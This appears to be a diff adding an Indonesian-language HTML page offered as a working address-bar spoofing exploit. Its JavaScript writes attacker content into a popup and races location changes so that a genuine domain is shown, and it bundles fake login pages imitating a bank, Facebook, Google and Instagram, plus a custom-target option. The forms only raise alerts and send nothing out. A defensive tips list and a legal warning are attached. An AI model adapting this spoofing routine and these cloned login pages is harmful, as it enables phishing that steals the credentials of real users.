@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .warning-box {
+            background: #ff1744;
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+        .card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 15px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: white;
+            text-align: center;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-danger {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+        }
+        .btn-danger:active {
+            transform: scale(0.98);
+        }
+        .info {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid #2196f3;
+        }
+        .success {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid #4caf50;
+        }
+        code {
+            background: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 13px;
+        }
+        .target-list {
+            list-style: none;
+            padding: 0;
+        }
+        .target-list li {
+            padding: 12px;
+            margin: 8px 0;
+            background: #f9f9f9;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border-left: 3px solid #667eea;
+        }
+        .target-list li:hover {
+            background: #f0f0f0;
+            transform: translateX(5px);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="warning-box">
+            ⚠️ <strong>EDUCATIONAL PURPOSES ONLY</strong><br>
+            <small>Working exploit - Jangan disalahgunakan!</small>
+        </div>
+
+        <h1>🎯 Address Bar Spoofing<br>Working Exploit</h1>
+
+        <div class="card">
+            <h2>✅ Bukti: Demo 4 Berhasil!</h2>
+            
+            <div class="success">
+                <strong>Screenshot Anda menunjukkan:</strong><br>
+                📍 Address bar: www.google.com<br>
+                📍 Title: Facebook<br>
+                📍 Content: Custom HTML<br><br>
+                <strong>✅ SPOOFING BERHASIL!</strong>
+            </div>
+
+            <div class="info">
+                <strong>Kenapa berhasil?</strong><br>
+                Kemungkinan Anda menggunakan:<br>
+                • Facebook in-app browser (WebView)<br>
+                • Browser mobile yang vulnerable<br>
+                • WebView yang belum di-patch
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>🚨 Exploit Berbahaya (Phishing)</h2>
+            <p style="color: #666; margin-bottom: 15px;">
+                Pilih target untuk membuat fake login page:
+            </p>
+
+            <ul class="target-list">
+                <li onclick="spoofBank()">
+                    🏦 <strong>Bank Login</strong><br>
+                    <small>Fake: secure-banking.com</small>
+                </li>
+                <li onclick="spoofFacebook()">
+                    📘 <strong>Facebook Login</strong><br>
+                    <small>Fake: facebook.com</small>
+                </li>
+                <li onclick="spoofGoogle()">
+                    🔍 <strong>Google Account</strong><br>
+                    <small>Fake: accounts.google.com</small>
+                </li>
+                <li onclick="spoofInstagram()">
+                    📷 <strong>Instagram Login</strong><br>
+                    <small>Fake: instagram.com</small>
+                </li>
+                <li onclick="spoofCustom()">
+                    ⚙️ <strong>Custom Target</strong><br>
+                    <small>Input URL sendiri</small>
+                </li>
+            </ul>
+        </div>
+
+        <div class="card">
+            <h2>🛡️ Cara Melindungi Diri</h2>
+            <ul style="line-height: 1.8; color: #555;">
+                <li>✅ Jangan buka link dari dalam app (gunakan browser eksternal)</li>
+                <li>✅ Selalu cek sertifikat SSL (tap ikon gembok)</li>
+                <li>✅ Update aplikasi & browser secara rutin</li>
+                <li>✅ Gunakan password manager (auto-detect domain)</li>
+                <li>✅ Aktifkan 2FA untuk semua akun penting</li>
+                <li>✅ Waspadai jika halaman terlihat aneh/berbeda</li>
+            </ul>
+        </div>
+
+        <div class="card" style="background: #fff3cd; border: 2px solid #ffc107;">
+            <h2 style="color: #856404;">⚖️ Legal Warning</h2>
+            <p style="color: #856404;">
+                Menggunakan teknik ini untuk phishing adalah <strong>ILEGAL</strong> dan dapat dikenakan:
+            </p>
+            <ul style="color: #856404; margin: 10px 0 0 20px;">
+                <li>Pasal ITE tentang penipuan online</li>
+                <li>Hukuman penjara & denda</li>
+                <li>Tuntutan perdata dari korban</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        function createSpoofWindow(targetURL, title, html) {
+            // Open blank window
+            let win = window.open("about:blank", "spoofed_" + Date.now());
+            
+            if (!win) {
+                alert("❌ Pop-up diblokir! Enable pop-up untuk browser ini.");
+                return;
+            }
+            
+            // Write malicious content
+            win.document.write(html);
+            win.document.close();
+            
+            // Race condition to spoof URL
+            let attempts = 0;
+            let maxAttempts = 100;
+            
+            let raceInterval = setInterval(() => {
+                attempts++;
+                
+                try {
+                    // Try to access location (will throw if cross-origin)
+                    let currentLoc = win.location.href;
+                    
+                    // If we can access it, try to change it
+                    if (currentLoc !== targetURL) {
+                        win.location.href = targetURL;
+                    }
+                } catch(e) {
+                    // Cross-origin blocked, try replace
+                    try {
+                        win.location.replace(targetURL);
+                    } catch(e2) {
+                        // Both failed
+                    }
+                }
+                
+                // Stop after max attempts
+                if (attempts >= maxAttempts) {
+                    clearInterval(raceInterval);
+                }
+            }, 5);
+            
+            // Cleanup after 3 seconds
+            setTimeout(() => {
+                clearInterval(raceInterval);
+            }, 3000);
+        }
+
+        function spoofBank() {
+            let html = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta name="viewport" content="width=device-width, initial-scale=1">
+                    <title>Internet Banking - Secure Login</title>
+                    <style>
+                        * { margin: 0; padding: 0; box-sizing: border-box; }
+                        body {
+                            font-family: Arial, sans-serif;
+                            background: #f0f2f5;
+                            padding: 20px;
+                        }
+                        .container {
+                            max-width: 400px;
+                            margin: 40px auto;
+                            background: white;
+                            padding: 30px;
+                            border-radius: 10px;
+                            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                        }
+                        .logo {
+                            text-align: center;
+                            font-size: 28px;
+                            color: #1565c0;
+                            font-weight: bold;
+                            margin-bottom: 10px;
+                        }
+                        .subtitle {
+                            text-align: center;
+                            color: #666;
+                            margin-bottom: 30px;
+                            font-size: 14px;
+                        }
+                        .warning {
+                            background: #ffebee;
+                            color: #c62828;
+                            padding: 15px;
+                            border-radius: 8px;
+                            margin-bottom: 20px;
+                            font-size: 13px;
+                            text-align: center;
+                        }
+                        .form-group {
+                            margin: 15px 0;
+                        }
+                        label {
+                            display: block;
+                            margin-bottom: 5px;
+                            color: #333;
+                            font-weight: 500;
+                        }
+                        input {
+                            width: 100%;
+                            padding: 12px;
+                            border: 1px solid #ddd;
+                            border-radius: 5px;
+                            font-size: 14px;
+                        }
+                        input:focus {
+                            outline: none;
+                            border-color: #1565c0;
+                        }
+                        button {
+                            width: 100%;
+                            padding: 14px;
+                            background: #1565c0;
+                            color: white;
+                            border: none;
+                            border-radius: 5px;
+                            font-size: 16px;
+                            font-weight: bold;
+                            cursor: pointer;
+                            margin-top: 10px;
+                        }
+                        button:active {
+                            background: #0d47a1;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <div class="logo">🏦 SecureBank</div>
+                        <div class="subtitle">Internet Banking Portal</div>
+                        
+                        <div class="warning">
+                            <strong>🚨 DEMO PHISHING PAGE</strong><br>
+                            Address bar spoofed! Ini BUKAN website bank asli!<br>
+                            Pada serangan nyata, data Anda akan dicuri!
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>User ID</label>
+                            <input type="text" placeholder="Enter your User ID" value="demo_user">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Password</label>
+                            <input type="password" placeholder="Enter your password" value="••••••••">
+                        </div>
+                        
+                        <button onclick="alert('🚨 Jika ini real phishing, kredensial Anda sudah dicuri ke server attacker!')">
+                            Login
+                        </button>
+                        
+                        <p style="text-align: center; margin-top: 20px; font-size: 12px; color: #999;">
+                            © 2025 SecureBank. All rights reserved.
+                        </p>
+                    </div>
+                </body>
+                </html>
+            `;
+            
+            createSpoofWindow("https://secure-banking.com/login", "Internet Banking - Login", html);
+        }
+
+        function spoofFacebook() {
+            let html = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta name="viewport" content="width=device-width, initial-scale=1">
+                    <title>Facebook - log in or sign up</title>
+                    <style>
+                        * { margin: 0; padding: 0; box-sizing: border-box; }
+                        body {
+                            font-family: Helvetica, Arial, sans-serif;
+                            background: #f0f2f5;
+                            padding: 20px;
+                        }
+                        .container {
+                            max-width: 400px;
+                            margin: 50px auto;
+                        }
+                        .logo {
+                            text-align: center;
+                            color: #1877f2;
+                            font-size: 48px;
+                            font-weight: bold;
+                            margin-bottom: 20px;
+                        }
+                        .card {
+                            background: white;
+                            padding: 25px;
+                            border-radius: 8px;
+                            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+                        }
+                        .warning {
+                            background: #ffebee;
+                            color: #c62828;
+                            padding: 12px;
+                            border-radius: 5px;
+                            margin-bottom: 15px;
+                            font-size: 13px;
+                        }
+                        input {
+                            width: 100%;
+                            padding: 14px;
+                            margin: 8px 0;
+                            border: 1px solid #dddfe2;
+                            border-radius: 6px;
+                            font-size: 15px;
+                        }
+                        button {
+                            width: 100%;
+                            padding: 14px;
+                            background: #1877f2;
+                            color: white;
+                            border: none;
+                            border-radius: 6px;
+                            font-size: 18px;
+                            font-weight: bold;
+                            margin-top: 10px;
+                            cursor: pointer;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <div class="logo">facebook</div>
+                        <div class="card">
+                            <div class="warning">
+                                ⚠️ FAKE LOGIN PAGE<br>
+                                Address bar di-spoof!
+                            </div>
+                            <input type="text" placeholder="Email or phone number" value="victim@email.com">
+                            <input type="password" placeholder="Password" value="••••••••">
+                            <button onclick="alert('Data stolen!')">Log In</button>
+                        </div>
+                    </div>
+                </body>
+                </html>
+            `;
+            
+            createSpoofWindow("https://www.facebook.com/login", "Facebook", html);
+        }
+
+        function spoofGoogle() {
+            let html = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta name="viewport" content="width=device-width, initial-scale=1">
+                    <title>Sign in - Google Accounts</title>
+                    <style>
+                        * { margin: 0; padding: 0; box-sizing: border-box; }
+                        body {
+                            font-family: 'Google Sans', Arial, sans-serif;
+                            background: white;
+                            padding: 20px;
+                        }
+                        .container {
+                            max-width: 450px;
+                            margin: 40px auto;
+                            border: 1px solid #dadce0;
+                            border-radius: 8px;
+                            padding: 40px;
+                        }
+                        .logo {
+                            text-align: center;
+                            margin-bottom: 20px;
+                        }
+                        .logo-text {
+                            font-size: 24px;
+                            color: #202124;
+                        }
+                        .title {
+                            font-size: 24px;
+                            font-weight: 400;
+                            margin-bottom: 30px;
+                        }
+                        .warning {
+                            background: #fce8e6;
+                            color: #d93025;
+                            padding: 15px;
+                            border-radius: 4px;
+                            margin-bottom: 20px;
+                            font-size: 13px;
+                        }
+                        input {
+                            width: 100%;
+                            padding: 13px 15px;
+                            border: 1px solid #dadce0;
+                            border-radius: 4px;
+                            font-size: 16px;
+                            margin-bottom: 20px;
+                        }
+                        button {
+                            padding: 10px 24px;
+                            background: #1a73e8;
+                            color: white;
+                            border: none;
+                            border-radius: 4px;
+                            font-size: 14px;
+                            font-weight: 500;
+                            cursor: pointer;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <div class="logo">
+                            <div class="logo-text">
+                                <span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc04">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>
+                            </div>
+                        </div>
+                        <div class="title">Sign in</div>
+                        <div class="warning">
+                            🚨 PHISHING DEMO<br>
+                            This is NOT real Google!
+                        </div>
+                        <input type="email" placeholder="Email or phone" value="victim@gmail.com">
+                        <button onclick="alert('Credentials stolen!')">Next</button>
+                    </div>
+                </body>
+                </html>
+            `;
+            
+            createSpoofWindow("https://accounts.google.com/signin", "Google Accounts", html);
+        }
+
+        function spoofInstagram() {
+            let html = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta name="viewport" content="width=device-width, initial-scale=1">
+                    <title>Instagram</title>
+                    <style>
+                        * { margin: 0; padding: 0; box-sizing: border-box; }
+                        body {
+                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+                            background: #fafafa;
+                            padding: 20px;
+                        }
+                        .container {
+                            max-width: 350px;
+                            margin: 40px auto;
+                        }
+                        .card {
+                            background: white;
+                            border: 1px solid #dbdbdb;
+                            padding: 40px;
+                            text-align: center;
+                        }
+                        .logo {
+                            font-family: 'Billabong', cursive;
+                            font-size: 48px;
+                            margin-bottom: 30px;
+                        }
+                        .warning {
+                            background: #ffebee;
+                            color: #c62828;
+                            padding: 12px;
+                            border-radius: 4px;
+                            margin-bottom: 15px;
+                            font-size: 12px;
+                        }
+                        input {
+                            width: 100%;
+                            padding: 10px;
+                            margin: 6px 0;
+                            border: 1px solid #dbdbdb;
+                            border-radius: 3px;
+                            background: #fafafa;
+                            font-size: 14px;
+                        }
+                        button {
+                            width: 100%;
+                            padding: 8px;
+                            background: #0095f6;
+                            color: white;
+                            border: none;
+                            border-radius: 8px;
+                            font-weight: 600;
+                            margin-top: 10px;
+                            cursor: pointer;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <div class="card">
+                            <div class="logo">Instagram</div>
+                            <div class="warning">
+                                ⚠️ FAKE PAGE<br>
+                                Spoofed address bar!
+                            </div>
+                            <input type="text" placeholder="Phone number, username, or email" value="victim">
+                            <input type="password" placeholder="Password" value="••••••••">
+                            <button onclick="alert('Hacked!')">Log In</button>
+                        </div>
+                    </div>
+                </body>
+                </html>
+            `;
+            
+            createSpoofWindow("https://www.instagram.com/accounts/login", "Instagram", html);
+        }
+
+        function spoofCustom() {
+            let targetURL = prompt("Masukkan URL target untuk di-spoof:", "https://example.com");
+            
+            if (!targetURL) return;
+            
+            let html = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta name="viewport" content="width=device-width, initial-scale=1">
+                    <title>Custom Spoof</title>
+                    <style>
+                        body {
+                            font-family: Arial;
+                            padding: 30px;
+                            text-align: center;
+                            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                            color: white;
+                            min-height: 100vh;
+                        }
+                        .box {
+                            background: rgba(255,255,255,0.1);
+                            padding: 30px;
+                            border-radius: 15px;
+                            margin: 20px 0;
+                        }
+                        code {
+                            background: rgba(0,0,0,0.3);
+                            padding: 5px 10px;
+                            border-radius: 4px;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <h1>🎯 Custom Address Bar Spoof</h1>
+                    <div class="box">
+                        <h2>Target URL:</h2>
+                        <code>${targetURL}</code>
+                    </div>
+                    <div class="box">
+                        <p>Address bar seharusnya menampilkan URL di atas</p>
+                        <p>Tapi konten ini dari attacker!</p>
+                    </div>
+                    <button onclick="window.close()" style="padding:15px 30px; font-size:16px; border:none; border-radius:8px; cursor:pointer; margin-top:20px;">
+                        Close Window
+                    </button>
+                </body>
+                </html>
+            `;
+            
+            createSpoofWindow(targetURL, "Custom Spoof", html);
+        }
+    </script>
+</body>
+</html>
